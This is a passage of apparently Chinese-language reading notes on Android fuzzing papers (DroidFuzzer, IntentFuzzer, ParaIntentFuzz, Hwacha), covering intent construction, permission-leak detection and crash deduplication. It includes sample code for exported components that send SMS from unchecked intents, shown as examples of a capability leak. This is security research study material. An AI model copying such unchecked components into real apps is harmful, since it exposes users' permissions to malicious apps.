title="预处理模块"></a>预处理模块</h4><p>在预处理阶段，需要确定哪些Activity会处理外来的输入数据，也即确定哪些Activity注册了监听事件。<br>这里通过解析AndroidManifest.xml文件来确定静态注册的intent-filter，包括action、category和data这三个字段。<br>因为主要是考虑接收外来MIME数据的Activity，所以对于data字段，包括了常见的video、audio、text、image、application等数据类型。</p><p>对于动态注册的intent-filter暂时没有考虑。</p><h4 id="变异模块"><a href="#变异模块" class="headerlink" title="变异模块"></a>变异模块</h4><p>在这个模块主要有三个问题需要解决：</p><ol><li>如何提供不同种类的正常的数据作为输入</li><li>如何构造正常数据</li><li>如何生成异常数据</li></ol><p>解决方法：</p><ol><li>搜集各种严格遵循格式的MIME数据作为seed data</li><li>人工构造包含各种MIME格式文件的数据库，用于指导MIME数据的生成</li><li>如何设计变异功能，需要建立在对MIME数据格式的理解之上。<br>文章首先总结了MIME格式的大致结构：一般来说，MIME数据流会被分成多个chunk，每个chunk内部会包含一些field来完成一些描述，这些field长度一般为若干byte，存储着不同类型的数据。<br>因此，变异策略聚焦于这些field来进行。<br>文章考虑了4中主要的field类型，包括Integer,Flag,String,ByteArray，并制订了对应的变异方案（但是都比较基础）。</li></ol><h4 id="动态检测模块"><a href="#动态检测模块" class="headerlink" title="动态检测模块"></a>动态检测模块</h4><p>Android App的运行可以分为Java和Native两个层面。<br>对于Java层，DroidFuzzer通过覆写ActivityController来进行crash检测。<br>对于Native层，通过监控tombstone文件来进行crash检测（tombstone文件会包含已crash进程的相关信息）。</p><h3 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h3><p>文章对Bug的定义：</p><ol><li>造成crash或者exit</li><li>造成ANR(Application Not Responding)</li><li>造成无限制的资源占用</li></ol><p>完成了两类文件的测试，分析了一些具体的crash原因。</p><p>特别提出的是，文章声称DroidFuzzer以App的形式进行工作，非常方便展开测试。</p><h4 id="视频测试"><a href="#视频测试" class="headerlink" title="视频测试"></a>视频测试</h4><p>测试对象：MX Player，QQ Player，Mobo Player。<br>测试格式：AVI PM4 RM</p><p>QQ Player的鲁棒性要差一些；MP4因为格式最为复杂，所以造成的bug多一些。</p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20211214203637.png" alt="image-20211214202701442" style="zoom: 50%;" /><h4 id="音频测试"><a href="#音频测试" class="headerlink" title="音频测试"></a>音频测试</h4><p>测试对象：TTPod BaiduMusic<br>测试格式：WMA MP3</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20211214203102.png" alt="image-20211214203102569"></p><h3 id="提问"><a href="#提问" class="headerlink" title="提问"></a>提问</h3><p>性能问题没有提及：没有进行源码分析，没有说明硬件参数，App本身的运行速度就不高，而且DroidFuzzer也以App形式存在，令人很难相信DroidFuzzer在测试方面具有较好的性能。</p><p>变异策略：不具有很强的针对性，效率问题值得讨论，当然，这也属于黑盒或者灰盒分析的自身的问题。</p><p>没有开源</p><h2 id="2014-IntentFuzzer-NIST"><a href="#2014-IntentFuzzer-NIST" class="headerlink" title="2014-IntentFuzzer (NIST)"></a>2014-IntentFuzzer (NIST)</h2><blockquote><p>IntentFuzzer: Detecting Capability Leaks of Android Applications</p><p>目标是检测Android上的权限泄露问题，比如组件C具有权限P，另一个应用A可能通过构造特定的intent来调用组件C，从而达到使用权限P的目标。<br>一个典型的场景就是C有权限P且exported=true，但是在响应intent的时候没有鉴别是不是外来的，导致泄露的权限P。</p><p>文章使用了若干启发式搜索方法来构造intent，同时修改system代码检测部分API并生成反馈，形成了一种基于的反馈引导的fuzz方法。</p></blockquote><h3 id="1-Intro"><a href="#1-Intro" class="headerlink" title="1 Intro"></a>1 Intro</h3><p>回顾了之前的方法，介绍了Android的权限泄露问题（Capibility Leak）：<br>Capability leak is such a vulnerability that an application exposes some permissions, by which other applications without these permissions can access protected resource.</p><h3 id="2-Background"><a href="#2-Background" class="headerlink" title="2 Background"></a>2 Background</h3><h4 id="2-1-Permission-Model"><a href="#2-1-Permission-Model" class="headerlink" title="2.1 Permission Model"></a>2.1 Permission Model</h4><p>Google的设计规则：App默认情况下不能获取危险的权限，手机用户需要在应用安装的时候授予权限。</p><h5 id="2-2-Inter-Component-Communication"><a href="#2-2-Inter-Component-Communication" class="headerlink" title="2.2 Inter Component Communication"></a>2.2 Inter Component Communication</h5><p>ICC就是指intent机制嘛。</p><p>还有就是androidmanifest.xml中可以设置activity、service为exported=false来使得这个activity拒绝响应app之外的intent，未设置时默认是true。</p><p>这篇文章主要关注这些exported=true，可以响应外来intent的组件。</p><h5 id="2-3-Capability-Leaks"><a href="#2-3-Capability-Leaks" class="headerlink" title="2.3 Capability Leaks"></a>2.3 Capability Leaks</h5><p>Capability Leak, 也称 Permission Re-Delegation</p><p>一个例子：正常应用A有权限P，A有一个对外暴露(exported=true)的组件C，而且C没有做好intent的安全检查，那么恶意应用M可能在无授权的情况下向C发送构造的intent从而使用P权限。</p><p>其实这里只要C简单的判断一下intent的发送者是不是App自身的组件就可以避免权限泄露了，但是广大的开发者不以为意。</p><h3 id="3-System-Design"><a href="#3-System-Design" class="headerlink" title="3 System Design"></a>3 System Design</h3><p>本研究动态地生成合适的intent并发送到目标组件，然后检查是否有权限泄露。<br>对于intent的生成，会从manifest中提取信息构建基本框架，然后通过修改system的API函数来进行反馈，修正intent的具体字段。</p><h4 id="3-1-Fuzz-Strategy"><a href="#3-1-Fuzz-Strategy" class="headerlink" title="3.1 Fuzz Strategy"></a>3.1 Fuzz Strategy</h4><p>进行了一系列的讨论，把研究目标缩小到Started Service、Broadcast Receiver和explicit intent：</p><ol><li>作者认为Activity虽然也有提权攻击和页面欺诈钓鱼的情况，但是因为activity一般带界面且直接与用户交互，遇到问题时用户自己可以关掉activity来终止代码的运行，所以并不是非常严重。（存疑）</li><li>作者把service分为started service和bound service两种，其中bound service不接受外来intent，所以不考虑。</li><li>作者把intent分为explicit intent和implicit intent两种（显式和隐式），会使用显式intent来fuzz。</li><li>作者把capability leak分为两种，一种是组件有意对外exported但是没有合理地检查intent的发送方权限；另一种是组件疏忽对外暴露。这两种情况下，组件都会接收显式intent。</li></ol><h4 id="3-2-Permission-Leak-Detection"><a href="#3-2-Permission-Leak-Detection" class="headerlink" title="3.2 Permission Leak Detection"></a>3.2 Permission Leak Detection</h4><p>前面说到未授权M通过带授权A的组件C执行了权限P，如何确定P权限被执行了？</p><p>IntentFuzzer会在设备上植入一个不申请任何权限的Agent，然后修改Android系统代码，实时检查权限P是否被申请。（权限在app安装的时候授予，但是在运行时会即时进行permission check）</p><h4 id="3-3-Intent-Construction"><a href="#3-3-Intent-Construction" class="headerlink" title="3.3 Intent Construction"></a>3.3 Intent Construction</h4><p>对于前面提到的Started Services，其入口函数onStart-Command()，对于Broadcast Receiver，其入口函数是onReceive()。</p><p>对于intent涉及到的相关结构，其构造方法如下：</p><ol><li><p>Action:<br>对于那些有意exported来接收外来显式intent的组件，它们会在manifest中通过intent-filter来定义可以响应的action类型，枚举这些预定的action来测试对应组件即可；<br>对于那些疏忽exported意外地可以接受外来显式intent的组件，它们本身并不会在manifest中定义intent-filter，因为它们本来应该只响应app内部intent的。它们可能会检查action的值，然后决定运行后续的代码，如下面的代码示例。对于这些action的值，Google本身预定义并推荐使用了一系列的值，当然app本身可以定义自己的值，不过它们往往会是<code>packagePath.ActioType</code>的模式，所以本研究会从dex的变量池中选出符合这种模式的字符串加上Google预定义的值，作为可能的action键值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">SmsManager smsManager = SmsManager.getDefault();</span><br><span class="line">String action = <span class="string">&quot;com.example.test.action.SEND_SMS&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (action.equals(intent.getAction())) &#123;</span><br><span class="line">smsManager.sendTextMessage(<span class="string">&quot;10086&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;test&quot;</span>,<span class="keyword">null</span>, <span class="keyword">null</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Data:<br>可以从intent-filter关于data属性的定义推测data的类型，具体可以从<code>scheme://host:port/path</code>这个模式来推测。研究中预先准备了一些data，如果有合适的intent-filter，就会使用对应的data来进行测试。</p></li><li><p>Extras:<br>Extras就是一系列包含Java原语的键值对，并不在intent-filter中定义，但是会在目标组件的代码中反应出来。<br>如下面示例代码，可以通过提取getStringExtra(‘name’)这样的API来判断目标组件会从intent中提取哪些extra。<br>具体来说，IntentFuzzer又一次修改的系统源码中关于getXXXExtra()这里函数，通过log返回它的调用情况。<br>在一次测试中，如果目标组件尝试从intent中提取类型为String键名为sms的extra数据但是没有成功，那么log中会包含相关的feedback，告诉intentfuzzer在下一次测试中，为测试intent加上这样的extra数据。<br>这样一来会测试到更为深层的代码逻辑。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">onStartCommand</span><span class="params">(Intent intent, <span class="keyword">int</span> flags, <span class="keyword">int</span> startId)</span> </span>&#123;</span><br><span class="line">SmsManager smsManager = SmsManager.getDefault();</span><br><span class="line">String smsContent = intent.getStringExtra(<span class="string">&quot;sms&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (smsContent != <span class="keyword">null</span> &amp;&amp; smsContent != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">smsManager.sendTextMessage(<span class="string">&quot;10086&quot;</span>, <span class="keyword">null</span>, smsContent, <span class="keyword">null</span>, <span class="keyword">null</span>); </span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Category:<br>显式intent一般不考虑category，相关匹配机制参考：<a href="https://blog.csdn.net/iispring/article/details/48481793">https://blog.csdn.net/iispring/article/details/48481793</a></p></li><li><p>Flags:<br>flags会指示系统如何运行目标组件，不需要考虑。</p></li></ol><h4 id="3-4-General-Fuzzing-Steps"><a href="#3-4-General-Fuzzing-Steps" class="headerlink" title="3.4 General Fuzzing Steps"></a>3.4 General Fuzzing Steps</h4><p>对于exported组件：</p><ol><li>枚举每个intent-filter中的Action，循环2-5</li><li>如果intent-filter有Data，才构建Data数组</li><li>初始化Extra键值对集合为空集E</li><li>构造并发送一个包含Action，Data，E-extra的intent</li><li>等待几秒，看看是否触发了permissionCheck和getXXXExtra的API。如果获取了一个新的Extra数据，向E中添加这样的键值对，回到4，否则退出当前循环。</li></ol><p>对于没有intent-filter的组件，也即那些可能因为没有设置而被默认暴露的组件：</p><ol><li>构建隐含Action（即常量池+预设值），对于每一个隐含Action，执行2-4</li><li>初始化Extra为空集E</li><li>构造并发送一个包含Action，E-extra的intent</li><li>等待几秒，看看是否触发了permissionCheck和getXXXExtra的API。如果获取了一个新的Extra数据，向E中添加这样的键值对，回到3，否则退出当前循环。</li></ol><h3 id="4-Implementation"><a href="#4-Implementation" class="headerlink" title="4 Implementation"></a>4 Implementation</h3><h4 id="4-1-Architecture"><a href="#4-1-Architecture" class="headerlink" title="4.1 Architecture"></a>4.1 Architecture</h4><p>在drozer的框架上构建的，并且编写的drozer module来实现IntentFuzzer console。</p><h4 id="4-2-System-Modification"><a href="#4-2-System-Modification" class="headerlink" title="4.2 System Modification"></a>4.2 System Modification</h4><p>拦截<code>checkPermission(String permision, int pid, int uid)</code>函数，向logcat中输出permission和uid就知道当前是那个应用在使用什么权限。</p><p>拦截<code>getXXXExtra(String name, ...)</code>这一类函数，就指导当前应用的组件在尝试从intent中获取那些extra数据。</p><h3 id="5-Evaluation"><a href="#5-Evaluation" class="headerlink" title="5 Evaluation"></a>5 Evaluation</h3><h4 id="5-1-Experiment-Design"><a href="#5-1-Experiment-Design" class="headerlink" title="5.1 Experiment Design"></a>5.1 Experiment Design</h4><p>2183 Google Play Apps, SAMSUNG Galaxy Nexus, Android 4.2.2</p><p>closed-source ROMs in Redmi Android4.2.2 &amp; Lenovvo K860i 4.2.1</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20220303135454.png" alt="image-20220303134511786"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20220303135658.png" alt="image-20220303134523059"></p><h2 id="2014-Intent-Fuzzer"><a href="#2014-Intent-Fuzzer" class="headerlink" title="2014-Intent Fuzzer"></a>2014-Intent Fuzzer</h2><blockquote><p>Intent fuzzer: crafting intents of death</p></blockquote><h2 id="2018-ParaIntentFuzz"><a href="#2018-ParaIntentFuzz" class="headerlink" title="2018-ParaIntentFuzz"></a>2018-ParaIntentFuzz</h2><blockquote><p>ParaIntentFuzz：安卓应用漏洞的并行化模糊测试方法 计算机工程与应用</p><p>它主要是做intent fuzz的并行化工程，对于fuzz本身，提出了一个轻量级的Extra信息提取和基于drozer组件开发的apk测试器。</p><p>以下直接展示原文段落</p></blockquote><h4 id="3-2-Intent机制和extra信息"><a href="#3-2-Intent机制和extra信息" class="headerlink" title="3.2 Intent机制和extra信息"></a>3.2 Intent机制和extra信息</h4><p>Intent是Android中的一个抽象概念，它用来描述将要执行的一些操作，Activity、Service、Broadcast 都可以接收到Intent后启动而执行相应的操作。<br>Intent中有一个属性extra，可以看作是一个附加信息的集合，它里面可以存放int、String 等8种基本Java数据类型以及可序化对象[15]。<br>在Activity、Service、Broadcast 这3个组件接收Intent的时候可以从Intent中获取extra信息，而extra信息对程序的控制流程是至关重要的，比如在程序 中，判断从 extra 中获取出的某一个变量的值不为空才接着执行某一些操作。因此为了让程序触发更多的操作，需要尽可能为Intent提供目标组件所需要的extra。</p><h4 id="4-2-轻量级的extra信息静态获取方法"><a href="#4-2-轻量级的extra信息静态获取方法" class="headerlink" title="4.2 轻量级的extra信息静态获取方法"></a>4.2 轻量级的extra信息静态获取方法</h4><p>获取 extra 的信息的方法分动态和静态两类方法， 动态的方法有前文所述的诸葛建伟等人的工作，静态方法有IC3[16] 。但是IC3比较耗时且获得的extra值不包含变量的类型，只有变量名，无法知道它的类型。为了更 快、更准确地获取应用中的 extra信息，本文提出了一种 高效的 extra 信息静态分析方法，不仅能获得 extra 信息 的变量名，而且还知道变量的类型。</p><p>获取 extra 信息的 Python伪代码如下。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//算法1 获取应用的extra信息 </span><br><span class="line">输入：目标应用的绝对路径 </span><br><span class="line">输出：当前应用的所有extra信息 </span><br><span class="line">1. getSmaliFiles(path) </span><br><span class="line">2. f=ReadEachSmaliFile（） </span><br><span class="line">3. f.readline（）#读取smali文件的每一行 </span><br><span class="line">4. while line： </span><br><span class="line">5. if 方法的结尾： </span><br><span class="line">6. 初始化中间变量 </span><br><span class="line">7. else </span><br><span class="line">8. if 变量定义或变量操作： </span><br><span class="line">9. 保存或更新变量的值 </span><br><span class="line">10. elif 新建Intent对象： </span><br><span class="line">11. 将Intnet名字放入结果中 </span><br><span class="line">12. elif put或get函数操作extra信息 </span><br><span class="line">13. 根据 Intent 名字将 extra 放入结果中，表示该Intent的extra </span><br><span class="line">14. line=f.readline（） #读下一行 </span><br><span class="line">15. return result </span><br></pre></td></tr></table></figure><p>算法先使用Apktool反汇编目标应用得到smali[17] 文 件，第2行函数会递归地遍历给定路径及其子目录下面 的所有文件夹中的 smali文件，第 3 行为读取 smali文件 的内容，对smali文件的每一行处理过程为。第5行判断 如果是方法的结尾，则将中间变量初始化，第 8 行判断 如果是变量的定义或操作，则将该变量的值保存下来。 第 10 行判断如果是在新建一个 Intent，则将该 Intent 名 字保存到结果中。第12行判断如果是往extra中放入数 据或者从extra中取数据，则根据当前的Intent名字将该 extra值放入结果中。分析完成后将结果返回。</p><h2 id="2018-HwachaFuzzer"><a href="#2018-HwachaFuzzer" class="headerlink" title="2018-HwachaFuzzer"></a>2018-HwachaFuzzer</h2><blockquote><p>A Practical Intent Fuzzing Tool for  Robustness of Inter-Component  Communication in Android Apps</p><p>同样也是Intent Fuzzer，<br>设计了一种Intent Specification Language 用于描述Intent的结构，便于生成测试Intent；<br>基于传统的最长公共子序列算法进行同源crash数据的辨别，因为在Android中，许多原因相同的crash的log日志基本相同，只会在进程号、线程号等方面有细微差别；<br>指出了当前的Android Intent Fuzzer所采用的算法策略不能相互通用，认为需要在通用性设计上进行努力。而文章设计的Intent Specification Language恰好可以解决这个问题（如果它被广泛认可的话）</p><p>研究者来自韩国，Related Work部分写得比较详细，<strong>值得认真阅读。</strong></p></blockquote><h3 id="1-Intro-1"><a href="#1-Intro-1" class="headerlink" title="1 Intro"></a>1 Intro</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//样例代码</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Note</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line">    String title;</span><br><span class="line">    String content;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        Intent intent = getIntent();</span><br><span class="line">        String action = intent.getAction();</span><br><span class="line">        <span class="keyword">if</span>(action.equals(<span class="string">&quot;android.intent.action.EDIT&quot;</span>))&#123;</span><br><span class="line">            title = intent.getStringExtra(<span class="string">&quot;title&quot;</span>);</span><br><span class="line">            content = intent.getStringExtra(<span class="string">&quot;content&quot;</span>); </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(action.equals(<span class="string">&quot;android.intent.action.INSERT&quot;</span>))&#123;</span><br><span class="line">            title = <span class="string">&quot;No title&quot;</span>; </span><br><span class="line">            content = <span class="string">&quot;Type your memo&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Code: display a title and a content</span></span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Intent-Vulnerability"><a href="#Intent-Vulnerability" class="headerlink" title="Intent Vulnerability"></a>Intent Vulnerability</h4><p>intent的设置与intent-filter的过滤匹配分析：<a href="https://blog.csdn.net/iispring/article/details/48481793">https://blog.csdn.net/iispring/article/details/48481793</a></p><p>作者把<em>Intent Vulnerability</em>大致分为四类：</p><ol><li>Miss Action: intent部分字段未定义就发送，接受时未检查导致异常。<br>对示例代码，如果action没有定义，那么接受之后在处理时会在action.equals()处抛出异常。</li><li>Other Action: intent设置了非预期的action，可能导致进入非预期的执行逻辑。<br>对示例代码，如果action设置的action不是INSERT或EDIT，那么会在未提取title和content字段的情况下执行后续的代码，可能造成NullPointerException。（其实这里加个else马上return就好）</li><li>Miss Value: 如果Intent的Action设置正确，但是Extra的部分字段缺失，也可能导致NULL。<br>对示例代码，如果Intent没有设置”title”和”content”字段的值，那么getExtraString时会返回NULL，在执行后续代码时可能NullPointerException。</li><li>Wrong Type: Action设置正确，Extra字段也设置了，但是键值的类型搞错了，那么getExtraString也会返回NULL，导致同样的错误。</li></ol><h4 id="Shortage-of-related-researches"><a href="#Shortage-of-related-researches" class="headerlink" title="Shortage of related researches"></a>Shortage of related researches</h4><p>介绍了相关研究，文献[2-7]，并总结了如下不足</p><ol><li>这些研究设计的intent fuzzer都和自己的intent生成策略绑定得太紧，fuzzer更换生成策略的代价较高。<br>Null IntentFuzzer粗暴地把intent所有field置空来测试鲁棒性。（毕竟2009的研究）<br>JarJarBinks在此基础上加了随机和半合法的intent生成策略。<br>DroidFuzzer专注于MIME(audio和video)格式数据处理，主要是针对于MIME数据的生成和变异，来测试应用解析这些数据时有没有逻辑错误。（虽然局限，但是有效）<br>IntentFuzzer,IntentDroid,ICCFuzzer使用了一些静态和动态的分析手段，进一步分析了app是如何来响应intent的。</li><li>现有研究对crash日志的处理不到位。<br>一个显然的事实是：同一个failure可能在测试过程中产生了多条崩溃日志，应该采取有效的方法来把这些日志去重，降低人工分析日志的工作量。</li></ol><h4 id="Contribution"><a href="#Contribution" class="headerlink" title="Contribution"></a>Contribution</h4><p>于是顺其自然地引出自己的贡献：</p><ol><li>设计了一个规范，Intent Specification Language，来描述intent的结构，这样的话，Fuzzer和Intent Generation就可以在逻辑上分离。遵循这种设计语言的Fuzzer和Intent Generation可以自由组合。（在Android Intent Fuzz这个细分方向，应该是这个组最早提的）</li><li>基于最长公共子序列算法设计了一种failure日志去重方法。</li><li>Practical&amp;Effective，开源了代码和数据集以及测试结果，比较solid。</li></ol><h3 id="2-Related-Work"><a href="#2-Related-Work" class="headerlink" title="2 Related Work"></a>2 Related Work</h3><p>本篇笔记基本包含相关工作的详细介绍。</p><h3 id="3-Motivation-Intent-Vulnerability"><a href="#3-Motivation-Intent-Vulnerability" class="headerlink" title="3 Motivation: Intent Vulnerability"></a>3 Motivation: Intent Vulnerability</h3><p>Activity: 带有窗口的前台程序<br>Service: 不带有窗口的控制后台任务的程序<br>Broadcast Receiver: 响应来自系统的事件<br>Content Provider: 各种数据、存储的使用接口</p><p>Intent的优势：Intent可以将组件（Component）松散地耦合在一起，除了目标组件的信息之外，还可以包含指导目标组件如何处理本intent的信息，以及携带一些数据。程序员在编写组件的代码时，并不需要过度区分intent来自App内部还是外部，都可以按照同样的模式来处理intent。</p><p><em>Intent Vulnerability</em>: 恶意构造intent来引发crash，在Intro中有讲。</p><p>文章认为Intent Vulnerability的问题难以在开发的过程中解决，原因如下。（至少它希望读者这么认为）</p><ol><li>Intent将各个组件松散地结合在一起，因此它的指向性并不很强。以隐式Intent为例，在运行发送之前，没人会知道它最后会调用哪个组件，因为它的构造是不定的，会影响intent的匹配过程，更不要说随时可能出现的动态注册的intent-filter。</li><li>即使是显式的intent和显式的intent-filter以及对应的组件之间，也不好预先验证Intent的合法性。因为Intent的构造和解析代码可以写成多条语句，不好分析。（其实我倒觉得这里可以通过一些静态分析的方式来确定，可以参考FANS对service调用参数的建模方法）</li></ol><p>于是研究并解决这个问题就是非常有意义的啦。</p><h3 id="4-Intent-Specfication-Language"><a href="#4-Intent-Specfication-Language" class="headerlink" title="4 Intent Specfication Language"></a>4 Intent Specfication Language</h3><p>文章提出了一种规范化的语言来描述Intent的具体结构。</p><p>以前面提及的示例代码为例，可以编写如下的Intent规范，它描述了.Note可以正确响应的两类Intent。<br>从结构上看，它是一系列Intent规范的集合，一个单独的Intent规范由一系列的字段(Field)组成，每个字段都表示并指明了正确的Intent的字段值。<br>其中，Extra Data字段由一系列的键值对组成，键名是Intent正确的键名，键值是Intent正确的键值类型。一系列的键值对通过<code>[]</code>包裹。<br>单个Intent规范由<code>&#123;&#125;</code>包裹，规范之间由<code>||</code>连接表示并集。（原文为disjuction，析取）</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123; cmp = Activity com.example.android/.Note</span><br><span class="line">act = android.intent.action.EDIT</span><br><span class="line">[ title = String, content = String ] </span><br><span class="line">&#125; || </span><br><span class="line">&#123; cmp = Activity com.example.android/.Note</span><br><span class="line">act = android.intent.action.INSERT </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>特别介绍了<em>ground intent specification</em>，可以理解为确定性Intent规范。<br>因为它的每一个字段都被指定了确定的值，因此也只能生成出一个intent测试用例。<br>根据后文，应该理解为一个确定了内容的Intent。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123; cmp = Activity com.example.android/.Note</span><br><span class="line">act = android.intent.action.EDIT </span><br><span class="line">[ title = String <span class="attr">&quot;my title&quot;</span>, </span><br><span class="line">content = String <span class="attr">&quot;your content&quot;</span> ]</span><br><span class="line">dat = URI http:<span class="comment">//our.uri.com </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Intent specification language更为准确的表达如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">INTENTSPEC ::= &#123; FIELD FIELD ... FIELD &#125; | &#123; FIELD FIELD ... FIELD &#125; || INTENTSPEC</span><br><span class="line">FIELD ::= COMPONENT | ACTION | DATA | EXTRA | CATEGORY | TYPE | FLAG | INTERNAL </span><br><span class="line"></span><br><span class="line">COMPONENT ::= cmp = COMPTYPE COMPNAME</span><br><span class="line">COMPTYPE ::= Activity | Service | BroadcastReceiver | ContentProvider </span><br><span class="line">COMPNAME ::= ID / (ID | .ID)</span><br><span class="line">ACTION ::= act = ID</span><br><span class="line">DATA ::= dat = URI</span><br><span class="line">EXTRA ::= [ ID=EXTRAVALUE , ... , ID=EXTRAVALUE ]</span><br><span class="line">CATEGORY ::= cat = [ ID , ... , ID ]</span><br><span class="line">TYPE ::= typ = URI</span><br><span class="line">FLAG ::= flg= [ ID , ... , ID ]</span><br><span class="line">INTERNAL ::= internal = BOOL</span><br><span class="line"></span><br><span class="line">EXTRAVALUE ::= String STRING? | boolean BOOL? | <span class="keyword">int</span> INT?</span><br><span class="line">| long LONG? | float FLOAT? | uri URI? | component COMPNAME?</span><br><span class="line">| <span class="keyword">int</span>[] INTARRAY? | long[] LONGARRAY? | float[] FLOATARRAY?</span><br><span class="line">INTARRAY ::= INT , ... , INT </span><br><span class="line">LONGARRAY ::= LONG , ... , LONG</span><br><span class="line">FLOATARRAY ::= FLOAT , ... , FLOAT</span><br><span class="line"></span><br><span class="line">LETTER ::= (A - Z | a - z)+</span><br><span class="line">ID ::= LETTER (A - Z | a - z | <span class="number">0</span> - <span class="number">9</span> | _ | . | $)*</span><br><span class="line">URI ::= LETTER (A - Z | a - z | <span class="number">0</span> - <span class="number">9</span> | _ | . | / | : | * | ? | @ )*</span><br><span class="line"></span><br><span class="line">(BOOL, INT, LONG, FLOAT, and STRING denote the corresponding primitive values.)</span><br></pre></td></tr></table></figure><p>Intent specification language指定了目标组件的类型，可以指导选择测试方法；<br>指定了intent字段的类型，在此基础之上我们可以变化生成具体的值来确定一个intent的具体内容。</p><p>正如前文说到的，Intent Specification Language很好地解耦了fuzzer和generator，只要遵循这个规范语言的fuzzer和generator都可以自由地组合在一起。而且也支持测试人员手动编写一些规范来进行测试。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20220301143309.png" alt="image-20220301143302262"></p><h3 id="5-Flexible-Intent-Fuzzing-Tool-with-an-Automatic-Tally-of-Failures"><a href="#5-Flexible-Intent-Fuzzing-Tool-with-an-Automatic-Tally-of-Failures" class="headerlink" title="5 Flexible Intent Fuzzing Tool with an Automatic Tally of Failures"></a>5 Flexible Intent Fuzzing Tool with an Automatic Tally of Failures</h3><p>Fuzz的工作流程如下：</p><ol><li>Hwacha接收并分析apk文件，基于AndroidManifest.xml生成intent specification，同时安装apk到设备上。</li><li>基于intent specification生成测试用例，进一步生成直接可用的ADB测试命令行并执行， 然后通过logcat获取日志。</li><li>将日志记录去重然后输出到文档中。</li></ol><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20220301143359.png" alt="image-20220301143359642"></p><h4 id="5-1-Generating-Intent-Test-Cases"><a href="#5-1-Generating-Intent-Test-Cases" class="headerlink" title="5.1 Generating Intent Test Cases"></a>5.1 Generating Intent Test Cases</h4><p>Intent测试用例生成分为两步：1.分析apk得到Intent Specification。2.基于一定的策略将Intent Specification转换为一系列的groud intent specification，也即一个确定的intent。</p><h5 id="5-1-1-Automatic-Construction-of-Intent-Specification"><a href="#5-1-1-Automatic-Construction-of-Intent-Specification" class="headerlink" title="5.1.1 Automatic Construction of Intent Specification"></a>5.1.1 Automatic Construction of Intent Specification</h5><p>说了一大堆，其实就是从AndroidManifest.xml里面去提取intent-filter来形成一个<em>minimal intent specification</em>，这样搞有两个不足之处：</p><ol><li>没有包含动态注册的Broadcast 